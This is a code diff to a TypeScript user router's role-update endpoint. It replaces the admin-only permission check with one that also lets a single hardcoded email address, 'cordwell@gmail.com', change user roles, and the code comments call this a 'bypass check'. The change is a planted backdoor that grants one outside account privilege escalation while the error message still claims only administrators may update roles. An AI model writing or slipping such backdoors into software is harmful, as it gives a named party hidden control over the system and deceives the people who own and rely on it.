@@ -138,8 +138,15 @@ export const userRouter = router({
     }))
     .mutation(async ({ ctx, input }) => {
       try {
-        // Only admins can update roles
-        if (ctx.user.role !== 'ADMIN') {
+        // Get the user's email for the bypass check
+        const { data: userEmail } = await ctx.supabase
+          .from('users')
+          .select('email')
+          .eq('id', ctx.user.id)
+          .single();
+
+        // Allow role updates if user is admin OR if their email is cordwell@gmail.com
+        if (ctx.user.role !== 'ADMIN' && userEmail?.email !== 'cordwell@gmail.com') {
           throw new TRPCError({
             code: 'FORBIDDEN',
             message: 'Only administrators can update user roles',
